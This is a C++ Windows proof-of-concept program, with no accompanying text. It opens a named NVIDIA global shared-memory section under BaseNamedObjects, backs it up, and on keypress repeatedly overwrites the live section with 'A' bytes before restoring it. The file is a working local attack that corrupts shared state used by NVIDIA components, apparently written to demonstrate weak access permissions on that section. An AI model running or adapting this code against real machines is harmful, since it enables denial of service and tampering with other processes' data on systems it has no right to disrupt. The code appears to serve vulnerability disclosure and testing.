

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <conio.h>
#pragma comment(lib, "ntdll.lib")


typedef enum _SECTION_INFORMATION_CLASS
{
	SectionBasicInformation,
	SectionImageInformation,
	SectionRelocationInformation,
	SectionOriginalBaseInformation,
	SectionInternalImageInformation,
	MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;
typedef struct _SECTIONBASICINFO {
	PVOID BaseAddress;
	ULONG AllocationAttributes;
	LARGE_INTEGER MaximumSize;
} SECTION_BASIC_INFORMATION, * PSECTION_BASIC_INFORMATION;

typedef enum _SECTION_INHERIT
{
	ViewShare = 1, // The mapped view of the section will be mapped into any child processes created by the process.
	ViewUnmap = 2  // The mapped view of the section will not be mapped into any child processes created by the process.
} SECTION_INHERIT;



NTSTATUS (WINAPI* _NtOpenSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
);

 NTSTATUS(WINAPI* _NtCreateSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER     MaximumSize,
	ULONG              SectionPageProtection,
	ULONG              AllocationAttributes,
	HANDLE             FileHandle
);

 NTSTATUS(WINAPI* _NtQuerySection)(
	 HANDLE SectionHandle,
	 SECTION_INFORMATION_CLASS SectionInformationClass,
	 PVOID SectionInformation,
	 SIZE_T SectionInformationLength,
	 PSIZE_T ReturnLength
	 );


 NTSTATUS (WINAPI* _NtMapViewOfSection)(
	 HANDLE          SectionHandle,
	 HANDLE          ProcessHandle,
	 PVOID* BaseAddress,
	 ULONG_PTR       ZeroBits,
	 SIZE_T          CommitSize,
	 PLARGE_INTEGER  SectionOffset,
	 PSIZE_T         ViewSize,
	 SECTION_INHERIT InheritDisposition,
	 ULONG           AllocationType,
	 ULONG           Win32Protect
 );

NTSTATUS (WINAPI* _NtUnmapViewOfSection)(
	 HANDLE ProcessHandle,
	 PVOID  BaseAddress
 );

int main()
{
	_NtOpenSection = (NTSTATUS(WINAPI*)(
		PHANDLE            SectionHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtOpenSection");
	_NtCreateSection = (NTSTATUS(WINAPI*)(
		PHANDLE            SectionHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PLARGE_INTEGER     MaximumSize,
		ULONG              SectionPageProtection,
		ULONG              AllocationAttributes,
		HANDLE             FileHandle
		))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
	_NtQuerySection = (NTSTATUS(WINAPI*)(
		HANDLE SectionHandle,
		SECTION_INFORMATION_CLASS SectionInformationClass,
		PVOID SectionInformation,
		SIZE_T SectionInformationLength,
		PSIZE_T ReturnLength
		))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySection");
	_NtMapViewOfSection = (NTSTATUS(WINAPI*)(
		HANDLE          SectionHandle,
		HANDLE          ProcessHandle,
		PVOID * BaseAddress,
		ULONG_PTR       ZeroBits,
		SIZE_T          CommitSize,
		PLARGE_INTEGER  SectionOffset,
		PSIZE_T         ViewSize,
		SECTION_INHERIT InheritDisposition,
		ULONG           AllocationType,
		ULONG           Win32Protect))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection");
	_NtUnmapViewOfSection = (NTSTATUS(WINAPI*)(
		HANDLE ProcessHandle,
		PVOID  BaseAddress
		))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");


	HANDLE hsection = NULL;
	UNICODE_STRING section_path;
	RtlInitUnicodeString(&section_path, L"\\BaseNamedObjects\\{52813408-3561-4705-820a-2b3b78be92ba}");
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &section_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NTSTATUS stat = _NtOpenSection(&hsection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_QUERY | DELETE, &objattr);
	if (stat)
	{
		printf("NVIDIA global section was not found.\n");
		return 1;
	}
	SECTION_BASIC_INFORMATION sbi = { 0 };
	SIZE_T retbytes = 0;
	stat = _NtQuerySection(hsection, SectionBasicInformation, &sbi, sizeof(sbi), &retbytes);
	if (stat)
	{
		printf("Failed to query NVIDIA section size.\n");
		return 1;
	}
	HANDLE hduplicate = NULL;
	InitializeObjectAttributes(&objattr, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);
	stat = _NtCreateSection(&hduplicate, GENERIC_ALL, &objattr, &sbi.MaximumSize, PAGE_READWRITE, SEC_COMMIT, NULL);
	if (stat)
	{
		printf("Failed create backup section, error : 0x%0.8X\n", stat);
		return 1;
	}
	
	PVOID nvsection = NULL;
	SIZE_T nvviewsz = sbi.MaximumSize.QuadPart;

	stat = _NtMapViewOfSection(hsection, GetCurrentProcess(), &nvsection, NULL, NULL, NULL, &nvviewsz, ViewUnmap, NULL, PAGE_READWRITE);
	if (stat)
	{
		printf("Failed map nvidia global section, error : 0x%0.8X\n", stat);
		return 1;
	}



	void* nvbackup = NULL;
	SIZE_T backupviewsz = sbi.MaximumSize.QuadPart;

	stat = _NtMapViewOfSection(hduplicate, GetCurrentProcess(), &nvbackup, NULL, NULL, NULL, &backupviewsz, ViewUnmap, NULL, PAGE_READWRITE);
	if (stat)
	{
		printf("Failed map backup section, error : 0x%0.8X\n", stat);
		return 1;
	}

	try {
		memmove(nvbackup, nvsection, backupviewsz);
	}
	catch (...) {

		printf("Failed to backup nvidia global section data");
		return 1;
	}
	do {
		printf("Press anything to corrupt nvidia global section.");
		if (_getch() == 27) // ESC
			goto cleanup;
		printf("\n");
		try {
			memset(nvsection, 'A', nvviewsz);
		}
		catch (...) {

			printf("Failed to corrupt nvidia global section data");
			return 1;
		}
		printf("Press anything to restore nvidia global section.");
		if (_getch() == 27) // ESC
			goto cleanup;
		printf("\n");
		try {
			memmove(nvsection, nvbackup, backupviewsz);
		}
		catch (...) {

			printf("Failed to restore nvidia global section data");
			return 1;
		}
	} while (1);


cleanup:

	memmove(nvsection, nvbackup, backupviewsz);
	if (hduplicate)
		NtClose(hduplicate);
	if (hsection)
		NtClose(hsection);
	if (nvsection)
		_NtUnmapViewOfSection(GetCurrentProcess(), nvsection);
	if (nvbackup)
		_NtUnmapViewOfSection(GetCurrentProcess(), nvbackup);

	return 0;
}

